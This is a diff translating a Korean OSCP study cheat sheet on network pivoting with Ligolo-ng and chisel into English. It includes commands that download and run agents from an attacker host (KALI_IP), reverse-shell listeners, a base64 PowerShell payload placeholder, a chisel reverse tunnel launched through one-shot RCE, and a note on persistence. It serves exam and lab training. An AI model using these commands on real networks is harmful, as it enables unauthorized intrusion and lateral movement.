@@ -4,17 +4,17 @@ date: 2026-06-20
 weight: 120
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "TUN 인터페이스 기반 피벗 도구. proxychains 없이 내부 서브넷을 직접 열거한다."
+summary: "TUN-interface pivoting tool. Enumerate internal subnets directly without proxychains."
 ---
 
-TUN 인터페이스 기반 피벗 도구. proxychains 없이 내부 서브넷을 직접 열거할 수 있다.
+TUN-interface pivoting tool. You can enumerate internal subnets directly without proxychains.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/ligolo-ng/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상(내부 서브넷), `KALI_IP` = 공격자(Kali) IP
+- Source: https://heretek.dev/oscp-cheatsheet/ligolo-ng/ (Jean Romero) — Reconstructed
+- Variables: `$TARGET` = target host (internal subnet), `KALI_IP` = attacker Kali IP
 
-- 바이너리: `~/Tools/ligolo-ng/` (proxy=linux-arm64, agents=linux-amd64 + windows-amd64)
+- Binaries: `~/Tools/ligolo-ng/` (proxy=linux-arm64, agents=linux-amd64 + windows-amd64)
 
-## 1 — 셋업 (Kali — 재부팅마다 다시 해야 함)
+## 1 — Setup (Kali — must be repeated after every reboot)
 
 ```bash
 # Create TUN interface (resets every reboot)
@@ -25,29 +25,29 @@ sudo ip link set ligolo up
 ~/Tools/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8443
 ```
 
-- `-selfcert` = TLS 인증서 자동 생성. 에이전트는 `-ignore-cert`로 수용한다.
-- `-api-laddr` = Ligolo 웹 UI를 8080에서 다른 포트로 옮긴다 (BloodHound가 8080을 쓴다).
-- (중요) 포트 충돌 경고: 최신 Ligolo-NG는 기본 8080 웹 대시보드가 있다. `-api-laddr` 없이 실행하면 BloodHound 포트를 뺏는다.
+- `-selfcert` = auto-generate a TLS certificate. The agent accepts it with `-ignore-cert`.
+- `-api-laddr` = move the Ligolo web UI off 8080 to another port (BloodHound uses 8080).
+- (Important) Port conflict warning: recent Ligolo-NG has a default web dashboard on 8080. Running without `-api-laddr` steals BloodHound's port.
 
-포트 배정 (암기):
+Port assignments (memorize):
 
 - BloodHound CE: 8080
-- Burp Suite: 8081 (Burp 설정에서 기본 8080에서 변경)
-- Ligolo proxy 리스너: 11601
-- Ligolo 대시보드: 8443 (-api-laddr로 설정)
+- Burp Suite: 8081 (change from the default 8080 in Burp settings)
+- Ligolo proxy listener: 11601
+- Ligolo dashboard: 8443 (set with -api-laddr)
 
-세션 도중 Ligolo 재시작이 필요하면:
+If you need to restart Ligolo during a session:
 
-1. 타깃의 에이전트 명령어를 기록해둔다
-2. Kali에서 `Ctrl+C`로 프록시 종료
-3. 위의 같은 명령으로 재시작
-4. 타깃에서 에이전트 재실행 — 재접속된다
-5. Ligolo 콘솔: `session` → 선택 → `start`
-6. 라우트는 유지된다(이미 추가됨) — `ping`으로 확인
+1. Note the agent command used on the target
+2. Stop the proxy on Kali with `Ctrl+C`
+3. Restart with the same command as above
+4. Re-run the agent on the target — it reconnects
+5. Ligolo console: `session` → select → `start`
+6. Routes are preserved (already added) — verify with `ping`
 
-- (주의) OSCP 랩은 매일 리셋된다. 매일 아침 해야 할 일: TUN 생성 → 프록시 시작 → 에이전트 재업로드 → 재접속 → 라우트 재추가. 셋업 명령은 스크립트로 저장해둔다.
+- (Note) The OSCP lab resets daily. Every morning: create TUN → start proxy → re-upload agent → reconnect → re-add routes. Save the setup commands as a script.
 
-## 2 — 에이전트를 타깃에 업로드
+## 2 — Upload the agent to the target
 
 ### Windows
 
@@ -70,7 +70,7 @@ wget http://KALI_IP/agent -O /tmp/agent && chmod +x /tmp/agent
 curl http://KALI_IP/agent -o /tmp/agent && chmod +x /tmp/agent
 ```
 
-### Kali에서 파일 서빙
+### Serving files from Kali
 
 ```bash
 # Python HTTP server (simple)
@@ -80,7 +80,7 @@ cd ~/Tools/ligolo-ng && python3 -m http.server 80
 impacket-smbserver share ~/Tools/ligolo-ng -smb2support
 ```
 
-## 3 — 에이전트 연결
+## 3 — Connect the agent
 
 ```bash
 # Windows
@@ -90,9 +90,9 @@ C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert
 /tmp/agent -connect KALI_IP:11601 -ignore-cert
 ```
 
-Kali의 프록시 콘솔에 에이전트가 접속 보고를 한다.
+The agent reports its connection to the proxy console on Kali.
 
-## 4 — 라우팅 (내부 서브넷 접근)
+## 4 — Routing (reaching the internal subnet)
 
 ```bash
 # In ligolo proxy console:
@@ -106,7 +106,7 @@ sudo ip route add $TARGET/24 dev ligolo
 # ⚠️ Use /24 — a typo like /2 will break routing silently
 ```
 
-이제 모든 Kali 도구(nmap, netexec, evil-winrm 등)가 `$TARGET/24`에 직접 연결된 것처럼 동작한다.
+Now every Kali tool (nmap, netexec, evil-winrm, etc.) behaves as if directly connected to `$TARGET/24`.
 
 ```bash
 # Verify
@@ -114,9 +114,9 @@ ping -c1 $TARGET
 netexec smb $TARGET/24
 ```
 
-## 5 — 리스너 (내부 머신에서 리버스 셸 받기)
+## 5 — Listeners (catching reverse shells from internal machines)
 
-- 내부 머신은 Kali에 직접 닿을 수 없다. ligolo 리스너로 포트를 피벗 경유로 포워드한다.
+- Internal machines cannot reach Kali directly. Forward the port through the pivot with a ligolo listener.
 
 ```bash
 # In ligolo proxy console (on the active session):
@@ -131,7 +131,7 @@ listener_list
 listener_stop <id>
 ```
 
-- 동작 방식: 내부 타깃이 `PIVOT_HOST:4444`에 연결 → ligolo가 `KALI:4444`로 포워드.
+- How it works: the internal target connects to `PIVOT_HOST:4444` → ligolo forwards to `KALI:4444`.
 
 ```bash
 # On Kali — start your listener as normal
@@ -142,11 +142,11 @@ nc -lvnp 4444
 powershell -e <BASE64_PAYLOAD_POINTING_TO_PIVOT_IP:4444>
 ```
 
-- 내부 머신은 자신이 피벗 호스트와 통신한다고 생각한다. Ligolo가 이것을 Kali로 터널링한다.
+- The internal machine believes it is talking to the pivot host. Ligolo tunnels this to Kali.
 
-### 대체: Chisel (listener_add 실패 또는 피벗이 없을 때)
+### Alternative: Chisel (when listener_add fails or there is no pivot)
 
-chisel을 쓰는 경우: 타깃이 직접 도달 가능(피벗 불필요), 일회성 RCE가 ligolo 에이전트를 유지하지 못함(Text4Shell 등), 타깃 이그레스가 80/443으로 필터링됨.
+Use chisel when: the target is directly reachable (no pivot needed), a one-shot RCE cannot keep the ligolo agent alive (Text4Shell, etc.), or target egress is filtered to 80/443.
 
 ```bash
 # === STEP 1: Kali — start chisel server ===
@@ -163,26 +163,26 @@ wget http://KALI_IP/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 ./chisel client KALI_IP:8000 R:9999:127.0.0.1:8080         # expose target's localhost:8080 → Kali:9999
 ```
 
-일회성 RCE (Runtime.exec는 셸을 파싱하지 않음 — 감싸야 한다) (중요):
+One-shot RCE (Runtime.exec does not parse a shell — you must wrap it) (important):
 
 ```bash
 bash -c "nohup /tmp/chisel client KALI_IP:8000 R:4444:127.0.0.1:4444 >/dev/null 2>&1 &"
 ```
 
-- 스펙 형식: `R:<kali_port>:<target_host>:<target_port>`. `R:`은 방향을 반전한다 — 클라이언트가 연결하고, 포트는 Kali에서 열린다.
+- Spec format: `R:<kali_port>:<target_host>:<target_port>`. `R:` reverses the direction — the client connects and the port opens on Kali.
 
-## 6 — 더블 피벗 (두 홉 깊이)
+## 6 — Double pivot (two hops deep)
 
-시나리오: `Kali → Host A (DMZ) → Host B (internal) → Host C (deeper subnet)`
+Scenario: `Kali → Host A (DMZ) → Host B (internal) → Host C (deeper subnet)`
 
-### Step 1: 첫 피벗 (Kali → Host A)
+### Step 1: First pivot (Kali → Host A)
 
 ```bash
 # Already done: agent on Host A connected, route to internal subnet added
 sudo ip route add $TARGET/24 dev ligolo      # Host B's subnet
 ```
 
-### Step 2: 터널을 경유해 Host B에 에이전트 업로드
+### Step 2: Upload an agent to Host B through the tunnel
 
 ```bash
 # Serve agent on Kali
@@ -196,7 +196,7 @@ listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
 wget http://HOST_A_INTERNAL_IP/agent -O /tmp/agent && chmod +x /tmp/agent
 ```
 
-### Step 3: Host B의 에이전트가 Kali 프록시에 도달하게 하기
+### Step 3: Make Host B's agent reach the Kali proxy
 
 ```bash
 # Add listener on Host A to forward ligolo port back to Kali
@@ -207,7 +207,7 @@ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 /tmp/agent -connect HOST_A_INTERNAL_IP:11601 -ignore-cert
 ```
 
-### Step 4: 더 깊은 서브넷 라우팅
+### Step 4: Route the deeper subnet
 
 ```bash
 # New session appears in proxy console — select it
@@ -224,23 +224,23 @@ start --tun ligolo2
 sudo ip route add $TARGET/24 dev ligolo2
 ```
 
-이제 Kali 도구가 두 홉을 거쳐 `$TARGET/24`에 도달한다.
+Now Kali tools reach `$TARGET/24` across two hops.
 
-- 가장 깊은 서브넷에서 리버스 셸을 받으려면 Host B와 Host A 양쪽에 리스너를 체이닝한다.
+- To catch a reverse shell from the deepest subnet, chain listeners on both Host B and Host A.
 
-## 문제 해결 (Troubleshooting)
+## Troubleshooting
 
-- Agent는 연결되지만 yamux가 계속 죽음 → TARGET 박스를 리셋한다. 이전 세션의 좀비 에이전트 프로세스가 taskkill 후에도 간섭할 수 있다. 그래도 안 되면 Kali의 프록시를 재시작
-- Agent가 아예 연결 안 됨 → 피벗 방화벽 확인, 11601 포트 개방 확인, `-retry` 플래그 시도
-- "Device for nexthop is not up" → TUN 인터페이스가 아직 없다. `sudo ip tuntap add` + `ip link set up` 을 먼저 실행
-- Route add "Invalid prefix" → CIDR 확인 — `/24` 이어야 한다. `/2`, `/254` 오타 주의
-- 라우트를 추가했지만 연결이 안 됨 → 프록시 콘솔에서 `start` 실행 확인; Kali에서 `ip route` 확인
-- 터널을 통과하는 도구 타임아웃 → 일부 도구는 긴 타임아웃 필요; nmap은 `-T3 --max-retries 2`
-- 하나의 피벗에 여러 서브넷 → 같은 ligolo 인터페이스에 라우트를 여러 개 추가
-- 터널을 통한 DNS resolution → `/etc/resolv.conf`에 내부 DNS를 추가하거나 IP를 직접 사용
-- 재부팅 시 에이전트 죽음 → 서비스 또는 예약 작업으로 에이전트를 실행해 지속성 확보
+- Agent connects but yamux keeps dying → reset the TARGET box. A zombie agent process from a previous session can interfere even after taskkill. If that fails, restart the proxy on Kali
+- Agent never connects → check the pivot firewall, confirm port 11601 is open, try the `-retry` flag
+- "Device for nexthop is not up" → the TUN interface does not exist yet. Run `sudo ip tuntap add` + `ip link set up` first
+- Route add "Invalid prefix" → check the CIDR — it must be `/24`. Watch for typos like `/2` or `/254`
+- Route added but no connectivity → confirm `start` was run in the proxy console; check `ip route` on Kali
+- Tool times out through the tunnel → some tools need long timeouts; for nmap use `-T3 --max-retries 2`
+- Multiple subnets behind one pivot → add multiple routes to the same ligolo interface
+- DNS resolution through the tunnel → add the internal DNS to `/etc/resolv.conf` or use IPs directly
+- Agent dies on reboot → run the agent as a service or scheduled task for persistence
 
-## OSCP 시험 체크리스트
+## OSCP Exam Checklist
 
 ```text
 [ ] TUN interface created: sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
